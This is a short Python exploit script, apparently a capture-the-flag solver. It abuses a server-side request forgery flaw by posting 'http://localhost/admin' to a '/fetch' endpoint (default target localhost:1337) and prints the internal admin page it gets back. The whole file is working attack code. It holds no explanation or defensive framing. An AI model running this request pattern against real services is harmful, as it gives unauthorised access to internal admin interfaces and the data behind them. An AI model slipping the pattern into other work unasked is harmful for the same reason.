import requests
import sys

s = requests.Session()
url = sys.argv[1] if len(sys.argv) > 1 else 'http://localhost:1337'

# Abuse the ssrf vulnerability to fetch the admin page from localhost
r = s.post(url + "/fetch", data={'url': 'http://localhost/admin'})
print(r.text)
